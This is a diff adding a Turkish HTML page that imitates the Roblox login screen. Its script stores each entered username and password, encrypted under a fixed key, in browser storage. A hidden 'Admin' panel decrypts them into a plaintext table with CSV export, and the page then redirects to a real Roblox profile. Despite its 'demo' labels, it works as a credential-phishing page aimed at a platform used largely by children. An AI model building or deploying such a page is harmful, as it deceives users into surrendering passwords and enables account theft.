@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Roblox'a Giriş Yap</title>
+<style>
+  :root{--bg:#0b0b0c;--panel:#1e1f22;--panel-2:#232427;--muted:#9aa0a6;--accent:#e3e6ea;}
+  *{box-sizing:border-box}html,body{height:100%}
+  body{margin:0;background:linear-gradient(180deg,#0b0b0c,#0f0f10);color:var(--accent);display:flex;align-items:center;justify-content:center;padding:48px 20px;font-family:Inter,Arial,sans-serif}
+  .container{width:420px;max-width:92vw;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,0.6);overflow:hidden;position:relative}
+  /* Admin text in top corner */
+  .admin-text{
+    position:fixed;
+    top:10px;
+    right:12px;
+    font-size:13px;
+    color:var(--muted);
+    background:transparent;
+    padding:6px 8px;
+    border-radius:6px;
+    border:1px solid rgba(255,255,255,0.04);
+    cursor:pointer;
+    font-weight:700;
+    z-index:9999;
+  }
+  .admin-text:hover{ color:var(--accent); border-color:rgba(255,255,255,0.08); background:rgba(255,255,255,0.01); }
+  .panel{padding:28px 28px 20px;background:linear-gradient(180deg,var(--panel),var(--panel-2))}
+  .title{text-align:center;font-size:26px;font-weight:800;margin:2px 0 18px;color:#e7e7e8}
+  form{display:flex;flex-direction:column;gap:12px}
+  .input{background:#2a2b2d;border-radius:8px;padding:12px 14px;border:1px solid rgba(255,255,255,0.04);color:var(--accent);font-size:14px;outline:none}
+  .input::placeholder{color:var(--muted)}.input:focus{box-shadow:0 6px 18px rgba(0,0,0,0.6);border-color:rgba(255,255,255,0.06)}
+  .btn-primary{margin-top:6px;width:100%;background:transparent;border:1px solid rgba(255,255,255,0.08);padding:12px;border-radius:8px;color:var(--accent);font-weight:700;cursor:pointer}
+  .link-center{text-align:center;margin-top:6px;font-size:13px;color:var(--muted)}
+  .divider{height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.03),transparent);margin:16px 0}
+  .extra-buttons{display:flex;flex-direction:column;gap:10px}
+  .btn-ghost{background:#2a2b2d;border-radius:8px;padding:10px 12px;text-align:center;font-weight:700;color:var(--muted);border:1px solid rgba(255,255,255,0.02);cursor:pointer}
+  .signup{text-align:center;padding:12px 0 18px;color:var(--muted)}
+  .footer{border-top:1px solid rgba(255,255,255,0.02);padding:18px 22px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:center;font-size:13px;color:var(--muted);background:linear-gradient(180deg,transparent,rgba(0,0,0,0.03))}
+  .modal-backdrop{position:fixed;inset:0;background:rgba(3,3,3,0.6);display:none;align-items:center;justify-content:center;z-index:9998;padding:20px}
+  .modal{width:min(900px,98%);max-height:90vh;overflow:auto;background:#141416;border-radius:8px;padding:18px;border:1px solid rgba(255,255,255,0.04)}
+  .modal h3{margin:0 0 12px}.modal .controls{display:flex;gap:8px;margin-bottom:12px}
+  .modal button{padding:8px 10px;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--muted);cursor:pointer;font-weight:700}
+  .modal table{width:100%;border-collapse:collapse;font-size:13px}
+  .modal th,.modal td{padding:8px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03);color:var(--accent)}
+  .small{font-size:12px;color:var(--muted)}
+  @media(max-width:480px){.title{font-size:20px}.container{width:92%}}
+</style>
+</head>
+<body>
+  <!-- Visible admin text in top corner -->
+  <div class="admin-text" id="adminText" title="Yönetici paneli">Admin</div>
+
+  <div class="container" role="main" aria-labelledby="loginTitle">
+    <div class="panel">
+      <div class="title" id="loginTitle">Roblox'a Giriş Yap</div>
+      <form id="loginForm" onsubmit="handleDemoSubmit(event)">
+        <input class="input" id="identifier" name="identifier" type="text" placeholder="Kullanıcı Adı/E-posta/Telefon" autocomplete="off" required />
+        <input class="input" id="password" name="password" type="password" placeholder="Şifre" autocomplete="new-password" required />
+        <button class="btn-primary" type="submit">Giriş Yap</button>
+        <div class="link-center"><a href="https://www.roblox.com/tr/users/889002887/profile/forgot-password-or-username" target="_blank" rel="noopener">Kullanıcı Adını veya Şifreni mi unuttun?</a></div>
+        <div class="divider" aria-hidden="true"></div>
+        <div class="extra-buttons" role="group" aria-label="Ek giriş seçenekleri">
+          <button type="button" class="btn-ghost" onclick="oneTimeCode()">Tek Kullanımlık Kodu Bana E-postayla Gönder</button>
+          <button type="button" class="btn-ghost" onclick="twoFactor()">Geçiş Anahtarı ile Giriş Yap</button>
+          <button type="button" class="btn-ghost" onclick="otherDevice()">Başka Bir Cihaz Kullan</button>
+        </div>
+        <div class="signup">Hesabın yok mu? <a href="https://www.roblox.com/account/signup" target="_blank" rel="noopener">Kaydol</a></div>
+      </form>
+    </div>
+    <div class="footer" aria-label="Footer">
+      <div class="left"><a href="#">Hakkımızda</a><a href="#">Koşullar</a><a href="#">Gizlilik</a><a href="#">Blog</a></div>
+      <div class="right"><a href="#">Ebeveynler</a><a href="#">Yardım</a><a href="#">Site haritası</a></div>
+    </div>
+  </div>
+
+  <div class="modal-backdrop" id="modalBackdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" id="adminModal">
+      <h3>Giriş Denemeleri - Yönetici Paneli</h3>
+      <div class="small">Bu panel yalnızca bu tarayıcıda saklanan verileri gösterir. Gerçek şifreleri test etmeyin.</div>
+      <div class="controls">
+        <button id="closeModal">Kapat</button>
+        <button id="clearLogs">Kayıtları Temizle</button>
+        <button id="exportCsv">CSV İndir</button>
+      </div>
+      <div id="logContainer" class="small">Henüz kayıt yok.</div>
+    </div>
+  </div>
+
+<script>
+// Keys in localStorage
+const ADMIN_META_KEY = 'demo_admin_meta_v2';
+const LOG_KEY = 'demo_login_attempts_enc_v2';
+
+// utilities
+const enc = new TextEncoder();
+const dec = new TextDecoder();
+function bufToB64(buf){ return btoa(String.fromCharCode(...new Uint8Array(buf))); }
+function b64ToBuf(b64){ return Uint8Array.from(atob(b64), c=>c.charCodeAt(0)); }
+function nowISO(){ return new Date().toISOString(); }
+function maskPassword(pw){ return pw ? '•'.repeat(pw.length) : ''; }
+function escapeHtml(str){ return String(str).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
+function randBytes(len){ const a=new Uint8Array(len); crypto.getRandomValues(a); return a; }
+
+// derive AES-GCM key (256) from password and salt using PBKDF2
+async function deriveKeyFromPassword(password, salt, iterations=150000){
+  const baseKey = await crypto.subtle.importKey('raw', enc.encode(password), {name:'PBKDF2'}, false, ['deriveKey']);
+  const key = await crypto.subtle.deriveKey(
+    {name:'PBKDF2', salt: salt, iterations: iterations, hash: 'SHA-256'},
+    baseKey,
+    {name:'AES-GCM', length: 256},
+    false,
+    ['encrypt','decrypt']
+  );
+  return key;
+}
+
+// encrypt/decrypt helpers
+async function aesEncryptString(key, text){
+  const iv = randBytes(12);
+  const ct = await crypto.subtle.encrypt({name:'AES-GCM', iv: iv}, key, enc.encode(text));
+  return {cipherB64: bufToB64(ct), ivB64: bufToB64(iv)};
+}
+async function aesDecryptString(key, cipherB64, ivB64){
+  const ct = b64ToBuf(cipherB64);
+  const iv = b64ToBuf(ivB64);
+  const plainBuf = await crypto.subtle.decrypt({name:'AES-GCM', iv: iv}, key, ct);
+  return dec.decode(plainBuf);
+}
+
+// Admin meta get/set
+function getAdminMeta(){ const s = localStorage.getItem(ADMIN_META_KEY); return s ? JSON.parse(s) : null; }
+function setAdminMeta(meta){ localStorage.setItem(ADMIN_META_KEY, JSON.stringify(meta)); }
+
+// create admin password
+async function createAdminPasswordFlow(){
+  const pass1 = prompt('Yeni admin parolası oluşturun (tarayıcıda saklanacak):');
+  if(!pass1) return alert('Parola oluşturulmadı.');
+  const pass2 = prompt('Parolayı tekrar girin:');
+  if(pass1 !== pass2) return alert('Parolalar eşleşmedi.');
+  const salt = randBytes(16);
+  const key = await deriveKeyFromPassword(pass1, salt);
+  const verifierPlain = 'demo-verifier-v1';
+  const {cipherB64, ivB64} = await aesEncryptString(key, verifierPlain);
+  setAdminMeta({salt: bufToB64(salt), verifier: cipherB64, verifier_iv: ivB64});
+  alert('Admin parolası kaydedildi.');
+}
+
+// prompt admin login and show modal
+async function promptAdminLogin(){
+  const meta = getAdminMeta();
+  if(!meta) return createAdminPasswordFlow();
+  const attempt = prompt('Admin parolasını girin:');
+  if(!attempt) return;
+  try{
+    const salt = b64ToBuf(meta.salt);
+    const key = await deriveKeyFromPassword(attempt, salt);
+    const decv = await aesDecryptString(key, meta.verifier, meta.verifier_iv);
+    if(decv !== 'demo-verifier-v1') throw new Error('Verifier mismatch');
+    renderLogsWithKey(key);
+    document.getElementById('modalBackdrop').style.display = 'flex';
+    document.getElementById('modalBackdrop').setAttribute('aria-hidden','false');
+  }catch(err){
+    console.error(err);
+    alert('Parola hatalı veya doğrulanamadı.');
+  }
+}
+
+// save attempt (encrypted)
+async function saveAttempt(identifier, password){
+  const meta = getAdminMeta();
+  let cipherB64 = '';
+  let ivB64 = '';
+  if(meta){
+    const salt = b64ToBuf(meta.salt);
+    const storageKey = await deriveKeyFromPassword('storage-static-secret-v1', salt);
+    const res = await aesEncryptString(storageKey, password);
+    cipherB64 = res.cipherB64; ivB64 = res.ivB64;
+  } else {
+    const tempKeyMaterial = randBytes(32);
+    const tempKey = await crypto.subtle.importKey('raw', tempKeyMaterial, {name:'AES-GCM'}, false, ['encrypt']);
+    const iv = randBytes(12);
+    const ct = await crypto.subtle.encrypt({name:'AES-GCM', iv}, tempKey, enc.encode(password));
+    cipherB64 = bufToB64(ct); ivB64 = bufToB64(iv);
+  }
+  const attempts = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
+  attempts.push({
+    id: Date.now(),
+    time: nowISO(),
+    identifier: identifier,
+    passwordMask: maskPassword(password),
+    cipher: cipherB64,
+    iv: ivB64
+  });
+  localStorage.setItem(LOG_KEY, JSON.stringify(attempts));
+}
+
+// decrypt and render logs
+
+async function renderLogsWithKey(keyForDecrypt){
+  const attempts = JSON.parse(localStorage.getItem(LOG_KEY) || '[]').slice().reverse();
+  if(attempts.length === 0){
+    document.getElementById('logContainer').innerHTML = '<div class="small">Henüz giriş denemesi yok.</div>';
+    return;
+  }
+  // Show decrypted plaintext and encrypted cipher (truncated with tooltip)
+  let html = '<table><thead><tr><th>Zaman</th><th>Kullanıcı</th><th>Parola (düz)</th><th>Şifre (şifrelenmiş - kısaltma)</th></tr></thead><tbody>';
+  for(const a of attempts){
+    let plain = '';
+    let cipherDisplay = '';
+    try{
+      const meta = getAdminMeta();
+      if(!meta) throw new Error('No meta');
+      const salt = b64ToBuf(meta.salt);
+      const storageKey = await deriveKeyFromPassword('storage-static-secret-v1', salt);
+      plain = await aesDecryptString(storageKey, a.cipher, a.iv);
+      // prepare a short preview of the cipher for display
+      cipherDisplay = a.cipher ? (a.cipher.slice(0,16) + '...' + a.cipher.slice(-8)) : '';
+    }catch(e){
+      plain = '[şifre çözülemedi]';
+      cipherDisplay = a.cipher ? (a.cipher.slice(0,16) + '...' + a.cipher.slice(-8)) : '[yok]';
+    }
+    html += `<tr>
+      <td class="small">${new Date(a.time).toLocaleString()}</td>
+      <td>${escapeHtml(a.identifier)}</td>
+      <td>${escapeHtml(plain)}</td>
+      <td title="${escapeHtml(a.cipher || '')}">${escapeHtml(cipherDisplay)}</td>
+    </tr>`;
+  }
+  html += '</tbody></table>';
+  document.getElementById('logContainer').innerHTML = html;
+}
+
+// handle form submit
+async function handleDemoSubmit(e){
+  e.preventDefault();
+  const id = document.getElementById('identifier').value.trim();
+  const pw = document.getElementById('password').value;
+  if(id.length < 1){ alert('Lütfen kullanıcı adını girin.'); return; }
+  await saveAttempt(id, pw);
+  document.getElementById('password').value = ''; document.getElementById('identifier').value = '';
+  alert('Giriş bilgileri demo olarak şifrelenip tarayıcınızda kaydedildi. Resmi siteye yönlendiriliyorsunuz...');
+  window.open('https://www.roblox.com/tr/users/889002887/profile', '_blank', 'noopener');
+}
+
+// admin controls
+const adminText = document.getElementById('adminText');
+adminText.addEventListener('click', () => { promptAdminLogin(); });
+
+const modalBackdrop = document.getElementById('modalBackdrop');
+const closeModal = document.getElementById('closeModal');
+const clearLogsBtn = document.getElementById('clearLogs');
+const exportCsvBtn = document.getElementById('exportCsv');
+
+closeModal && closeModal.addEventListener('click', () => { modalBackdrop.style.display='none'; modalBackdrop.setAttribute('aria-hidden','true'); });
+clearLogsBtn && clearLogsBtn.addEventListener('click', () => { if(confirm('Tüm kayıtları temizlemek istediğinizden emin misiniz?')){ localStorage.removeItem(LOG_KEY); document.getElementById('logContainer').innerHTML='<div class="small">Henüz giriş denemesi yok.</div>'; } });
+exportCsvBtn && exportCsvBtn.addEventListener('click', () => { exportCsv(); });
+
+function exportCsv(){
+  const attempts = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
+  if(attempts.length===0){ alert('İndirilecek kayıt yok.'); return; }
+  let csv = 'time,identifier,password_mask,cipher,iv\n';
+  attempts.forEach(a => { csv += `${a.time.replace(/,/g,' ')},"${a.identifier.replace(/"/g,'""')}",${a.passwordMask},${a.cipher},${a.iv}\n`; });
+  const blob = new Blob([csv], {type:'text/csv;charset=utf-8;'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href=url; a.download='login_attempts.csv'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+}
+
+function oneTimeCode(){ alert('Demo: Tek kullanımlık kod talebi. Gerçek talep için resmi siteyi kullanın.'); }
+function twoFactor(){ alert('Demo: Geçiş anahtarı talebi. Gerçek talep için resmi siteyi kullanın.'); }
+function otherDevice(){ alert('Demo: Başka cihazla giriş. Gerçek talep için resmi siteyi kullanın.'); }
+
+</script>
+</body>
+</html>
